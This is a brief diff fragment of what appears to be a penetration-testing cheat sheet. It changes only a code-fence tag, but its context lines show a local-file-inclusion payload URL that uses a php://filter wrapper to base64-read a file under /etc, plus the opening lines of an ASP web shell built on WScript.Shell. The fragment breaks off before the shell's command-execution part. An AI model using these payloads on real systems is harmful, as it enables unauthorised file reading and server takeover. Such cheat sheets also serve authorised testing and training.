@@ -5,7 +5,7 @@ https://X.X.X.X/image.php?img=php://filter/convert.base64-encode/resource=/etc/p
 ```
 ## Webshell
 ASP : 
-```asp
+```aspx
 <%
 Response.write("<pre>")
 Set rs = CreateObject("WScript.Shell")
